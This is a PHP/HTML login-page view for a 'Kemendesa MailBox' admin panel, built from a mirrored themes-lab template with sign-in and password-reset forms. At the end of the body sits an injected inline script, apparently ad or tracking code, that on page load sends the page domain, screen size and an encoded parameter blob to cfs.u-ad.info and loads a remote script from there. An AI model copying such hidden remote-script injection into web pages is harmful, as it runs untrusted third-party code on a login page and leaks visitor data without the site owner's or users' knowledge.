<!DOCTYPE html>
<html>

<!-- Mirrored from themes-lab.com/make/admin/layout1/user-login-v2.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 09 Jul 2015 18:27:37 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Kemendesa MailBox<?= isset($title) ? " | ".$title : "" ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta content="" name="description" />
    <meta content="themes-lab" name="author" />
    <link rel="shortcut icon" href="<?= base_url() ?>assets/global/images/favicon.png">
    <link href="<?= base_url() ?>assets/global/css/style.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/css/ui.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/plugins/bootstrap-loading/lada.min.css" rel="stylesheet">
</head>
<body class="account2" data-page="login">
<!-- BEGIN LOGIN BOX -->
<div class="container" id="login-block">
    <i class="user-img"></i>
    <div class="account-info">
        <a href="dashboard.html" class="logo"></a>
        <h3>Modular &amp; Flexible Admin.</h3>
        <ul>
            <li><i class="icon-magic-wand"></i> Fully customizable</li>
            <li><i class="icon-layers"></i> Mailbox Stacks</li>
            <li><i class="icon-arrow-right"></i> RTL direction support</li>
            <li><i class="icon-drop"></i> Report data collection</li>
        </ul>
    </div>
    <div class="account-form">
        <form action="<?=site_url()?>user/auth" method="post" class="form-signin" role="form">
            <!-- alert -->
            <?php if(isset($operation)){ ?>
                <div class="alert alert-<?=$operation?>" role="alert">
                    <p class="text-center"><?php echo $message; ?></p>
                </div>
            <?php } ?>
            <!-- end of alert -->

            <!-- alert -->
            <?php if($this->session->flashdata('operation') != NULL){ ?>
                <div class="alert alert-<?=$this->session->flashdata('operation')?>" role="alert">
                    <p class="text-center"><?=$this->session->flashdata('message'); ?></p>
                </div>
            <?php } ?>
            <!-- end of alert -->

            <h3><strong>Sign in</strong> to your account</h3>
            <div class="append-icon">
                <input type="text" name="username" id="username" class="form-control form-white username" placeholder="Username" required value="<?=set_value('username', '');?>">
                <i class="icon-user"></i>
            </div>
            <div class="append-icon m-b-20">
                <input type="password" name="password" class="form-control form-white password" placeholder="Password" required value="<?=set_value('password', '');?>">
                <i class="icon-lock"></i>
            </div>

            <button type="submit" id="signin" class="btn btn-lg btn-dark btn-rounded">Sign In</button>
            <span class="forgot-password"><a id="password" href="#">Forgot password?</a></span>
            <div class="form-footer">
                <div class="social-btn">
                    <button data-toggle="modal" data-target="#modal-unavailable" type="button" class="btn-fb btn btn-lg btn-block btn-square"><i class="fa fa-facebook pull-left"></i>Connect with Facebook</button>
                    <button data-toggle="modal" data-target="#modal-unavailable" type="button" class="btn btn-lg btn-block btn-blue btn-square"><i class="fa fa-twitter pull-left"></i>Login with Twitter</button>
                </div>
                <div class="clearfix">
                    <p class="new-here"><a href="<?= site_url() ?>register">New here? Sign up</a></p>
                </div>
            </div>
        </form>
        <form class="form-password" role="form">
            <h3><strong>Reset</strong> your password</h3>
            <div class="append-icon m-b-20">
                <input type="password" name="password" class="form-control form-white password" placeholder="Password" required>
                <i class="icon-lock"></i>
            </div>
            <button data-toggle="modal" data-target="#modal-unavailable" class="btn btn-lg btn-danger btn-block">Send Password Reset Link</button>
            <div class="clearfix m-t-60">
                <p class="pull-left m-t-20 m-b-0"><a id="login" href="#">Have an account? Sign In</a></p>
                <p class="pull-right m-t-20 m-b-0"><a href="<?= site_url() ?>register">New here? Sign up</a></p>
            </div>
        </form>
    </div>
</div>
<!-- END LOGIN BOX -->

<div class="modal fade modal-slideleft" id="modal-unavailable" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
                <div class="row">
                    <div class="col-md-12">
                        <h2 class="c-primary m-b-30">We apologize this feature currently unavailable.</h2>
                        <button type="button" class="btn btn-primary btn-embossed btn-block" data-dismiss="modal">Okay, I'm good</button>
                        <button type="button" data-dismiss="modal" class="btn btn-white btn-block">Learn more</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<p class="account-copyright">
    <span>Copyright &copy; <?= date("Y") ?> </span><span>KEMENDESA LAB</span>.<span>All rights reserved.</span>
</p>

<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-1.11.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-migrate-1.2.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/gsap/main-gsap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap/js/bootstrap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/backstretch/backstretch.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-loading/lada.min.js"></script>
<script src="<?= base_url() ?>assets/global/js/pages/login-v2.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRRJQa4R3kWwV2PTraMsEfTpZpj0o8JKE5zUTCfKxs38QThqXjuYuNDD4XUVASBp%2bIjPsyQTmbG%2fj3Q0FGnhpPcwFbCaQHL7uussOJ90BM5XU448VHM%2bPWXObTudyvZpKhvA4lo5fjxxqYVFzH8hen0HTqYeJmaDjOAhmiRwXZ8m02F8Vj%2fJF0IrABD9GORDsmUxQ9XTeuZDdkY53c4iIOLgJ5R%2bOBOYdNDBB3%2fqVESAH%2bgXUXVHRExZR9fAtMbDEcNbEW3UXk464G%2bnSd7WQIkz%2b1ZcUn0zAtmyZMg2K%2bT06dT2uCvtmelC%2fhJQREaJtAJRpffEURmYJwVHl%2fjfmDSczLvXr0wgaXCZ1zdlEpqjqDwFY7urc6l0VDGo0iN69cNljpJMja0P4qFLXCfkBEXQp69nwq2vNDDTkf%2fl4jlZnfJhF8wvSdpBUciQ1ec187nBKcjVOD1ZZRdWk8KO78%2bVv9R9kyX9rZ5QGOuUg7pkqB122C9EYEkg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from themes-lab.com/make/admin/layout1/user-login-v2.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 09 Jul 2015 18:27:40 GMT -->
</html>